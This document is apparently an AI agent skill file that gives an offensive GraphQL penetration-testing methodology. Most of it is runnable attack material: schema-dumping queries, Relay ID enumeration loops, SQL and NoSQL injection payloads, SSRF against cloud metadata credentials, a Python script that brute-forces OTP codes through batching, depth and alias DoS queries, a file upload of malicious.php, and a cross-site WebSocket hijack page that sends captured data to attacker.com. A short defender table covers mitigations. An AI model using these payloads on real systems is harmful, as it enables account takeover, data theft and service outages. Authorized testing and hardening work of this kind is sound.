---
name: offensive-graphql
description: "Offensive methodology for attacking GraphQL APIs during penetration tests and bug bounty engagements. Covers the full attack lifecycle: endpoint discovery, introspection abuse and blind schema reconstruction when introspection is disabled, authentication and authorization bypass through Relay node IDs and nested object traversal, injection via variables and directives, query batching for brute force and OTP bypass, denial of service through depth bombs and alias amplification, WebSocket subscription hijacking, information disclosure through verbose errors and field suggestion oracles, and file upload abuse via the multipart GraphQL specification. Includes tool-specific guidance for InQL, graphql-cop, CrackQL, BatchQL, Altair, GraphQL Voyager, and clairvoyance. Trigger on: GraphQL, graphql, introspection query, batching attack, query depth, GraphQL injection, GraphQL IDOR, field suggestion, GraphQL auth bypass, GraphQL DoS, GraphQL security, graphql-cop, InQL, CrackQL, BatchQL, Relay node, alias amplification, subscription abuse, multipart upload GraphQL, schema enumeration, __schema, __type."
---

# Offensive GraphQL

GraphQL consolidates an entire API surface behind a single endpoint, making it a high-value target during web application assessments. Unlike REST, where each route maps to a discrete resource, a GraphQL schema exposes every type, field, mutation, and subscription in one queryable structure. Attackers who obtain or reconstruct that schema gain a complete map of the application's data model before writing a single exploit. This skill walks you through each phase of a GraphQL engagement with concrete queries, tool invocations, and chaining patterns.

## Quick Workflow

1. Discover the endpoint -- probe common paths, inspect client-side JS bundles, check WebSocket upgrade headers.
2. Fingerprint the implementation -- use graphw00f to identify the engine and tailor payloads.
3. Dump or reconstruct the schema -- full introspection query; if blocked, field suggestion probing or clairvoyance.
4. Map the attack surface -- feed the schema into GraphQL Voyager or InQL.
5. Test authentication and authorization -- every query and mutation with no token, low-privilege, and cross-user tokens.
6. Inject through resolvers -- SQL, NoSQL, and OS command payloads through arguments and variables.
7. Abuse batching -- arrayed operations for brute force, OTP bypass, and rate limit evasion.
8. Stress depth and complexity -- nested queries, alias fans, and circular fragments.
9. Probe subscriptions -- WebSocket with expired or missing tokens, subscribe to sensitive streams.
10. Exfiltrate via errors -- verbose stack traces, type mismatches, field suggestions.
11. Test file upload -- multipart GraphQL specification for oversized or malicious files.
12. Chain and escalate -- combine findings into multi-step attack paths with proof-of-concept queries.

---

## 1 -- Endpoint Discovery and Fingerprinting

Probe common paths with a minimal query body. A `__typename` response confirms a live GraphQL endpoint.

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' | jq .
```

Paths to probe: `/graphql`, `/graphiql`, `/v1/graphql`, `/v2/graphql`, `/api/graphql`, `/graphql/console`, `/playground`, `/explorer`, `/query`. Some servers accept GET requests:

```bash
curl -s "https://target.com/graphql?query=\{__typename\}"
```

Fingerprint the implementation to determine default behaviors (introspection state, error format, batching syntax):

```bash
python3 graphw00f.py -t https://target.com/graphql
```

Run graphql-cop for a one-pass configuration audit -- it reports introspection status, field suggestion leaks, GET-based query acceptance (CSRF risk), and unrestricted batching:

```bash
python3 graphql-cop.py -t https://target.com/graphql
```

---

## 2 -- Introspection and Blind Schema Reconstruction

### Full Introspection Dump

When introspection is enabled, pull the entire schema in one request. This is the single most valuable recon step.

```graphql
query FullIntrospection {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind name description
      fields(includeDeprecated: true) {
        name args { name type { ...T } defaultValue } type { ...T }
      }
      inputFields { name type { ...T } defaultValue }
      interfaces { ...T }
      enumValues(includeDeprecated: true) { name description }
      possibleTypes { ...T }
    }
    directives { name description locations args { name type { ...T } } }
  }
}
fragment T on __Type {
  kind name ofType { kind name ofType { kind name ofType { kind name } } }
}
```

Pipe the result into GraphQL Voyager for visual exploration, or load InQL in Burp Suite -- it parses the schema and generates individual queries for every field and mutation.

### Targeted __type Queries

When full introspection is disabled but `__type` lookups still work (a common misconfiguration where the server blocks `__schema` but forgets `__type`):

```graphql
query { __type(name: "User") { name fields { name type { name kind } } } }
```

### Bypassing Disabled Introspection

**Field suggestion oracle.** Most engines return "Did you mean..." when you query a non-existent field. Submit plausible names and harvest suggestions:

```graphql
query { __typename aaa }
```

```json
{
  "errors": [{
    "message": "Cannot query field \"aaa\" on type \"Query\". Did you mean \"user\", \"users\", \"admin\"?"
  }]
}
```

Automate this with clairvoyance, which iterates a wordlist, collects suggestions, and assembles a reconstructed schema:

```bash
python3 clairvoyance.py -t https://target.com/graphql -w wordlist.txt -o schema.json
```

**Apollo Sandbox.** If the target runs Apollo Server v3+, navigate to the endpoint in a browser. Apollo Sandbox performs introspection client-side even when the production toggle is off. Check Apollo Studio explorer if the server is registered there.

**Client-side bundles.** Search JS files for query strings, fragment definitions, and type names:

```bash
curl -s https://target.com/static/js/main.js | grep -oP '(query|mutation|fragment)\s+\w+'
```

---

## 3 -- Authentication and Authorization Bypass

Authorization bugs are pervasive because developers must implement field-level checks manually in each resolver. A single missing check on a nested field can expose the entire object graph.

### IDOR Through Relay Node IDs

Relay exposes a global `node` interface that resolves any object by an opaque base64-encoded ID (`Type:numericID`):

```bash
echo -n "VXNlcjoxMjM=" | base64 -d   # Output: User:123
```

Forge IDs for other users and query through the node interface:

```graphql
query {
  node(id: "VXNlcjoxMjQ=") {
    ... on User { id email role ssn }
  }
}
```

Enumerate sequentially:

```bash
for i in $(seq 1 100); do
  id=$(echo -n "User:$i" | base64)
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
    -d "{\"query\":\"{ node(id: \\\"$id\\\") { ... on User { id email role } } }\"}"
done
```

### Nested Object Authorization Gaps

Authorization enforced on the top-level query often does not carry to nested relationships. Access your own Order, then check whether the customer field traverses to another user's data:

```graphql
query {
  myOrders {
    id
    customer { id email paymentMethods { cardNumber expirationDate } }
  }
}
```

The `myOrders` resolver filters by your ID, but the `customer` resolver on Order may eagerly load the associated user without ownership checks.

### Relay Pagination and Cursor Manipulation

Decode opaque cursors (often base64 of an offset) and manipulate the value. If the cursor decodes to `cursor:999`, set it to `cursor:0` to access records from the beginning:

```graphql
query {
  users(first: 10, after: "Y3Vyc29yOjA=") {
    edges { node { id email } cursor }
    pageInfo { hasNextPage endCursor }
  }
}
```

### Mutation Authorization

Test every state-changing mutation with no token, low-privilege tokens, and cross-tenant tokens:

```graphql
mutation { updateUser(id: "OTHER_USER_ID", input: { role: "ADMIN" }) { id role } }
mutation { deleteAccount(userId: "OTHER_USER_ID") { success } }
```

---

## 4 -- Injection Through Resolvers

Variables and arguments flow directly into resolver functions. String concatenation in resolvers creates classic injection vectors.

### SQL Injection via Variables

```graphql
query GetUser($name: String!) { user(name: $name) { id email } }
```

```json
{"name": "admin' OR 1=1 --"}
```

Escalate with UNION-based injection:

```json
{"name": "' UNION SELECT username, password FROM admin_users --"}
```

### NoSQL Injection

For MongoDB-backed resolvers:

```json
{"filter": {"username": {"$ne": ""}, "password": {"$ne": ""}}}
```

Time-based detection:

```graphql
query { search(filter: "{\"$where\": \"sleep(5000)\"}") { results } }
```

### Directive Injection and Flooding

Directive flooding -- attaching thousands of `@include(if: true)` directives to a single field -- crashes parsers (CVE-2024-47614 in async-graphql):

```graphql
query { __typename @include(if: true) @include(if: true) @include(if: true) ... }
```

Generate a payload with 10,000 directives programmatically. Custom `@auth` or `@constraint` directives may also accept arguments you can manipulate to override server-side behavior.

### SSRF Through Resolver Arguments

If a mutation accepts a URL argument (webhooks, avatars, imports), test for SSRF:

```graphql
mutation { setAvatar(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") { success } }
```

---

## 5 -- Batching Attacks

GraphQL servers commonly accept arrays of operations in a single HTTP request. Back-end rate limiters often count HTTP requests, not individual operations within a batch, enabling powerful bypass attacks.

### Credential Brute Force

```json
[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"}
]
```

A single HTTP request carries hundreds of login attempts. The rate limiter sees one request.

### OTP / 2FA Bypass

Batch all possible 4-digit OTP values in chunks:

```python
import requests

ops = [{"query": f'mutation {{ verifyOTP(code: "{str(c).zfill(4)}") {{ success token }} }}'}
       for c in range(10000)]
for i in range(0, len(ops), 500):
    r = requests.post("https://target.com/graphql", json=ops[i:i+500],
                      headers={"Authorization": "Bearer <session_token>"})
    for idx, res in enumerate(r.json()):
        if res.get("data", {}).get("verifyOTP", {}).get("success"):
            print(f"Valid OTP: {str(i + idx).zfill(4)}")
```

### Alias-Based Batching

Some servers reject array batching but allow alias-based batching within a single query:

```graphql
query {
  a1: login(user: "admin", pass: "pass1") { token }
  a2: login(user: "admin", pass: "pass2") { token }
  a3: login(user: "admin", pass: "pass3") { token }
}
```

Automate with BatchQL and CrackQL:

```bash
python3 batch-ql.py -e https://target.com/graphql \
  -q 'mutation { login(user: "admin", pass: "FUZZ") { token } }' -w passwords.txt
python3 CrackQL.py -t https://target.com/graphql -q query.graphql -i inputs.csv --batch-size 500
```

---

## 6 -- Denial of Service

GraphQL's flexible query language is inherently susceptible to resource exhaustion unless the server enforces strict cost controls.

### Depth Bomb

Exploit circular relationships. If User has `friends` returning `[User]`, nest indefinitely -- eight levels deep on a user with 100 friends each triggers 100^8 resolver calls:

```graphql
query DepthBomb {
  users {
    friends { friends { friends { friends { friends { friends {
      id email
    } } } } } }
  }
}
```

### Alias Amplification

Request the same expensive field thousands of times using aliases. Each alias invokes the resolver independently:

```graphql
query {
  a1: expensiveReport(year: 2024) { data }
  a2: expensiveReport(year: 2024) { data }
  a3: expensiveReport(year: 2024) { data }
  # ... repeat 1000 times
}
```

### Circular Fragment Spread

Older implementations may not detect circular references, causing infinite recursion:

```graphql
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
query { user(id: 1) { ...A } }
```

### Incremental Delivery Abuse

If the server supports `@defer` and `@stream`, attach them to expensive subtrees to hold connections open and multiply compute:

```graphql
query {
  users(first: 1000) @stream(initialCount: 1) {
    id
    orders @defer { total items @stream(initialCount: 1) { name price } }
  }
}
```

---

## 7 -- Subscription Abuse and WebSocket Hijacking

Subscriptions run over WebSocket using `graphql-ws` or the older `subscriptions-transport-ws` protocol. These long-lived connections present a distinct attack surface.

### Unauthenticated Subscription

Connect without authentication in the `connection_init` payload, then subscribe:

```json
{"type": "connection_init", "payload": {}}
```

```json
{"id": "1", "type": "subscribe", "payload": {"query": "subscription { newOrder { id customer { email } total } }"}}
```

If the server does not validate connection_init, you receive real-time events for all new orders.

### Token Expiry on Long-Lived Connections

WebSocket connections persist after the initial handshake. If the server validates the JWT only during `connection_init`, a token that expires mid-session remains valid for the connection's lifetime. Test by connecting with a short-lived token, waiting for expiry, then sending a new subscription.

### Cross-Site WebSocket Hijacking (CSWSH)

If the WebSocket endpoint relies on cookies and does not validate the Origin header, hijack it from a malicious page:

```html
<script>
  var ws = new WebSocket("wss://target.com/graphql", "graphql-ws");
  ws.onopen = function() {
    ws.send(JSON.stringify({type:"connection_init",payload:{}}));
    ws.send(JSON.stringify({id:"1",type:"subscribe",
      payload:{query:"subscription { sensitiveEvent { data } }"}}));
  };
  ws.onmessage = function(e) { fetch("https://attacker.com/c?d="+btoa(e.data)); };
</script>
```

---

## 8 -- Information Disclosure and File Upload

### Verbose Error Messages

GraphQL engines often return implementation details in errors. Send type-mismatched arguments to trigger stack traces:

```json
{
  "errors": [{
    "message": "invalid input syntax for type integer: \"abc\"",
    "extensions": {
      "exception": {
        "stacktrace": [
          "Error: invalid input syntax for type integer: \"abc\"",
          "    at /app/node_modules/pg/lib/client.js:526:17",
          "    at /app/src/resolvers/user.js:42:12"
        ]
      }
    }
  }]
}
```

This reveals the database driver (PostgreSQL via `pg`), file paths, and line numbers.

### Field Suggestion as Schema Oracle

Even with introspection disabled, iterate through prefixes to reconstruct the schema via "Did you mean" responses:

```text
Query field "a" -> "admin", "account"
Query field "b" -> "billing", "blog"
Query field "c" -> "customer", "config", "cart"
```

### Hasura and Apollo-Specific Leaks

**Hasura** -- test `x-hasura-role` and `x-hasura-user-id` header injection when the admin secret is not enforced:

```bash
curl -s -X POST https://target.com/v1/graphql \
  -H "Content-Type: application/json" -H "x-hasura-role: admin" -H "x-hasura-user-id: 1" \
  -d '{"query": "{ users { id email password_hash } }"}'
```

**Apollo Federation** -- query the `_service` field for the full SDL of a subgraph:

```graphql
query { _service { sdl } }
```

### File Upload via Multipart GraphQL

The multipart request specification enables file uploads through mutations. Test for path traversal, unrestricted types, and oversized uploads:

```bash
curl -s -X POST https://target.com/graphql \
  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F 0=@malicious.php
```

Attack vectors: path traversal via manipulated `map` JSON paths, content-type trust (upload `.php`/`.jsp` and check for magic byte validation), multi-gigabyte uploads for size limit testing, and predictable temp file paths that may be web-accessible before processing.

---

## Detection / Defender View

| Attack Category | Detection / Prevention |
|---|---|
| Introspection abuse | Disable in production (`introspection: false`). Monitor for `__schema` and `__type` in query logs. |
| Field suggestion oracle | Disable suggestions (Apollo: custom plugin to strip; Yoga: `maskedErrors`). |
| IDOR via node IDs | Enforce ownership checks in every resolver. Use UUIDs over sequential IDs. |
| Nested auth gaps | Schema-level authorization directives (`@auth`, `@hasRole`). Checks at every resolver, not just top-level. |
| SQL / NoSQL injection | Parameterized queries exclusively. Never concatenate user input. |
| Batching brute force | Limit batch size (max 5 operations). Rate-limit by operation count, not HTTP request count. |
| Alias amplification | Alias count limits. Query cost analysis (graphql-query-complexity, GraphQL Armor). |
| Depth bomb | Max query depth 7-10 (graphql-depth-limit, GraphQL Armor). |
| Subscription hijack | Validate auth on every `connection_init`, re-validate tokens periodically, enforce Origin checks. |
| Verbose errors | Generic error messages in production. Strip stack traces and paths. |
| File upload abuse | Validate by magic bytes, enforce size limits, store outside web root, re-encode images. |
| CSRF | Require `Content-Type: application/json`. Reject GET-based mutations. Validate Origin. |

Key hardening tools: **GraphQL Armor** (depth, alias, cost, character limits for Apollo/Yoga/Envelop), **persisted queries** (allowlist known operations, reject ad-hoc queries via APQ with signature enforcement), and WAF rules that parse JSON bodies and inspect the `query` field rather than just URL parameters.

---

## Engagement Cheatsheet

```text
RECON
  Endpoint discovery       curl POST /graphql, /v1/graphql, /api/graphql with {__typename}
  Fingerprint              graphw00f -t <url>
  Introspection dump       Full __schema query via Altair or InQL
  Config audit             graphql-cop -t <url>
  Visualize schema         Introspection JSON into GraphQL Voyager

BLIND SCHEMA RECOVERY
  Field suggestions        Query invalid fields, collect "Did you mean" responses
  Automated recovery       clairvoyance -t <url> -w wordlist.txt
  Client bundles           grep -oP '(query|mutation|fragment)\s+\w+' main.js
  Apollo sandbox           Navigate to endpoint in browser

AUTH TESTING
  No-auth access           Replay every query/mutation without Authorization header
  Horizontal IDOR          Decode Relay node IDs, substitute other user IDs
  Vertical escalation      Test admin mutations with low-privilege tokens
  Nested traversal         Follow relationships to reach unauthorized objects
  Cursor manipulation      Decode Relay cursors, modify offset values

INJECTION
  SQLi via variables       {"name": "admin' OR 1=1 --"}
  NoSQL injection          {"filter": {"$ne": ""}}
  SSRF via URL args        Point URL fields at 169.254.169.254
  Directive flooding       10,000 @include(if: true) on a single field

BATCHING
  Array batching           [{"query":"mutation{login(...)}"}, ...]
  Alias batching           a1: login(...) a2: login(...) ...
  OTP exhaustion           Batch all 4-6 digit codes in chunks of 500
  Tools                    CrackQL, BatchQL

DoS
  Depth bomb               Nest circular relationships 8+ levels
  Alias amplification      1000+ aliases on an expensive resolver
  Fragment cycle           Circular fragment spreads (A -> B -> A)
  Incremental delivery     @defer/@stream on expensive subtrees

SUBSCRIPTIONS
  No-auth subscribe        connection_init with empty payload
  Token expiry test        Connect, wait for JWT expiry, send new subscription
  CSWSH                    Cross-site WebSocket hijack via malicious page

FILE UPLOAD
  Multipart spec           -F operations=... -F map=... -F 0=@file
  Path traversal           Manipulate map JSON paths
  Type bypass              Upload executable with benign Content-Type

INFO DISCLOSURE
  Verbose errors           Type-mismatched arguments, observe stack traces
  Federation SDL           { _service { sdl } }
  Hasura headers           x-hasura-role: admin without admin secret
```

---

## Key References

- GraphQL specification: https://spec.graphql.org/
- GraphQL multipart request spec: https://github.com/jaydenseric/graphql-multipart-request-spec
- InQL (Burp extension): https://github.com/doyensec/inql
- graphql-cop (security auditor): https://github.com/dolevf/graphql-cop
- CrackQL (batching/brute force): https://github.com/nicholasaleks/CrackQL
- BatchQL (batch query tool): https://github.com/assetnote/batchql
- clairvoyance (schema reconstruction): https://github.com/nikitastupin/clairvoyance
- graphw00f (fingerprinting): https://github.com/dolevf/graphw00f
- GraphQL Voyager (visualization): https://graphql-kit.com/graphql-voyager/
- Altair GraphQL Client: https://altairgraphql.dev/
- GraphQL Armor (hardening): https://github.com/Escape-Technologies/graphql-armor
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- HackTricks GraphQL: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html
- Damn Vulnerable GraphQL Application: https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
